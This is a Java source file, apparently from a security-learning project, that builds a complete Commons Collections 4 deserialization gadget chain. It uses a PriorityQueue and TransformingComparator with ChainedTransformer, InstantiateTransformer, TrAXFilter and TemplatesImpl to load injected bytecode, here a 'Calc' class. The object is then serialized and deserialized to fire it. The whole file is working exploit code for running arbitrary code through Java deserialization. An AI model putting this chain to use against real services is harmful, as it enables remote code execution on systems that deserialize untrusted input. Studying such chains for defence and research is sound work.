import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.ixpqxi.util.SerTools;

import javax.swing.*;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class EnterChain {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TransformerFactoryImpl factory = new TransformerFactoryImpl();

        TemplatesImpl templates = new TemplatesImpl();

//        Field tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates, factory);

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Calc");

        byte[] bytes = Files.readAllBytes(Paths.get("./util/target/classes/org/ixpqxi/util/Calc.class"));
        byte[][] bytecodes = {bytes};

        Field _bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates, bytecodes);

//        templates.newTransformer();

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templates}
        );

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        });

//        TransformingComparator transformingComparator = new TransformingComparator(instantiateTransformer);
//        transformingComparator.compare(TrAXFilter.class, null);


        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field transformingField = TransformingComparator.class.getDeclaredField("transformer");
        transformingField.setAccessible(true);
        transformingField.set(transformingComparator, chainedTransformer);

        SerTools.serialize(priorityQueue);
        SerTools.unserialize("ser.bin");
    }
}
